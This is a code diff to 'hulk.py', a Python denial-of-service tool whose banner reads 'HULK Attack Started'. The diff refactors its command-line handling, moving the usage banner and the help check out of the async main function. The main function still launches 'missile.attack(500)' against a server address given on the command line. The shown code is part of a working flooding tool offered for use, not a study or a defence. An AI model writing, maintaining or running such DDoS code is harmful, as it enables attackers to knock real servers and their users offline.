@@ -168,43 +168,39 @@ class Missile():
 
 if __name__ == "__main__":
     async def main(root, url):
-        def bordered(text):
-            sentences = text.splitlines()
-            hor = max(len(line) for line in sentences) + 2
-            pad = ['┌' + '─' * hor + '┐']
-            for line in sentences:
-                pad.append('│ ' + (line + ' ' * hor)[:hor - 1] + '│')
-            pad.append('└' + '─' * hor + '┘')
-            return '\n'.join(pad)
-
-        def invalid_args():
-            if len(sys.argv) != 2:
-                return True
-            return sys.argv[1].lower() == "help"
-
-        if invalid_args():
-            print(
-                bordered(
-                    'USAGE: python hulk.py <root_server-IP>\n\n'
-                    'Example: python hulk.py localhost\n'
-                )
-            )
-            sys.exit()
-
-        print(
-            bordered(
-                "-- HULK Attack Started --\n\n"
-                "Current Version: 3.0\n\n"
-                "Compatible with: Python 3.7\n\n"
-                "Author: Hyperclaw79\n"
-            )
-        )
         print(f"\nPerforming DDoS Attack on {url}.\n")
         loop = asyncio.get_event_loop()
         missile = Missile(root=root, url=url, loop=loop)
         root_status = await missile.attack(500)
         return root_status
+    
+    def bordered(text):
+        sentences = text.splitlines()
+        hor = max(len(line) for line in sentences) + 2
+        pad = ['┌' + '─' * hor + '┐']
+        for line in sentences:
+            pad.append('│ ' + (line + ' ' * hor)[:hor - 1] + '│')
+        pad.append('└' + '─' * hor + '┘')
+        return '\n'.join(pad)
 
+    if "help" in [arg.lower() for arg in sys.argv]:
+        print(
+            bordered(
+                'USAGE: python hulk.py <root_server-IP>\n\n'
+                'Example: python hulk.py localhost\n'
+            )
+        )
+        sys.exit(0)
+
+    print(
+        bordered(
+            "-- HULK Attack Started --\n\n"
+            "Current Version: 3.0\n\n"
+            "Compatible with: Python 3.7\n\n"
+            "Author: Hyperclaw79\n"
+        )
+    )
+        
     root = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     root_ip = "localhost"
     if len(sys.argv) > 1:
